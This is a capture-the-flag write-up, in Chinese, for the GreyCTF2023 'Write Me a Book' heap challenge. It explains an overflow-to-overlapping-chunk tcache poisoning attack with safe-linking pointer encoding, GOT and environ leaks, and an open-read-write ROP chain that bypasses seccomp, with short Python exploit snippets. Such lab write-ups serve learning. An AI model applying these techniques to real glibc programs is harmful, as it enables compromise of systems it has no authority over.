# GreyCTF2023 Write Me a Book

## 题目简述

题目实现最多十本书的堆管理器，使用 glibc 2.35，并启用 NX、canary 与 seccomp。`rewrite_book` 的长度处理可越界覆盖相邻 chunk 元数据，进而制造重叠 chunk。seccomp 只允许 `read`、`write`、`open`、`exit` 与 `exit_group`，所以最终必须使用 ORW 链读取 `/flag`。

## 解题过程

先创建若干相邻的小 chunk，并通过改写前一书籍扩展其可写范围，伪造后续 chunk 的 `size=0x41`。释放到 `0x40` tcache bin 后，利用重叠关系覆盖下一空闲 chunk 的 safe-linking 指针：

```python
encoded = target ^ (chunk_addr >> 12)
edit(overlap_idx, flat(0, 0, 0, 0x41, encoded))
```

把目标指向非 PIE 二进制中的全局 `books` 数组。两次分配后即可改写书籍条目的 `{size, pointer}`，并将某条目的长度扩大，形成稳定任意读写。随后完成三次定位：

1. 让条目指向 `stdout`，并把 `free@GOT` 改为 `puts`，泄露 libc；
2. 让条目指向 `libc.environ`，泄露栈地址；
3. 将条目指向 `environ-0x150` 附近的 `rewrite_book` 返回栈帧。

最后把 ORW ROP 写到该栈帧：

```python
rop(rax=SYS_open, rdi=path_addr, rsi=0)
rop.call(syscall_ret)
rop(rax=SYS_read, rdi=3, rsi=heap_buf, rdx=0x100)
rop.call(syscall_ret)
rop(rax=SYS_write, rdi=1, rsi=heap_buf, rdx=0x100)
rop.call(syscall_ret)
rop.raw(b"/flag\x00")
```

函数返回时执行该链，得到：

```text
grey{gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!}
```

## 方法总结

这条利用链的关键演进是“越界改元数据 → 重叠 chunk → tcache poisoning → 全局描述符任意读写 → 栈 ROP”。glibc safe-linking 只要求已知堆地址后正确编码 forward pointer，并不能修复上游越界写。seccomp 同时改变了最终目标：拿到控制流后不能调用 `system`，必须根据允许的系统调用构造 open-read-write。
